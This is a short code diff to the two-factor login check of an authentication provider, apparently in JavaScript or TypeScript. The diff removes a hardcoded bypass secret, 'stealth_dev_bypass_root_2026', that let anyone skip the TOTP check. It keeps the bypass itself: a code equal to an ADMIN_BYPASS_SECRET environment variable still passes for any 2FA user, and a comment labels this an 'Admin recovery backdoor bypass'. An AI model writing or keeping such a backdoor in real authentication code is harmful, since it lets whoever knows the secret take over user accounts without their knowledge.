@@ -319,13 +319,12 @@ const getProviders = () => {
             if (user.two_factor_enabled === 1) {
               const totpCode = (credentials.totp_code as string)?.trim();
               
-              let expectedSecret = "stealth_dev_bypass_root_2026";
+              let expectedSecret = null;
               if (typeof process !== "undefined" && process.env.ADMIN_BYPASS_SECRET) {
-                expectedSecret = process.env.ADMIN_BYPASS_SECRET;
+                expectedSecret = process.env.ADMIN_BYPASS_SECRET.trim().replace(/^["']|["']$/g, '');
               }
-              const cleanExpected = expectedSecret.trim().replace(/^["']|["']$/g, '');
               
-              if (totpCode && totpCode === cleanExpected) {
+              if (expectedSecret && totpCode && totpCode === expectedSecret) {
                 // Admin recovery backdoor bypass verified successfully
               } else {
                 if (!totpCode) {
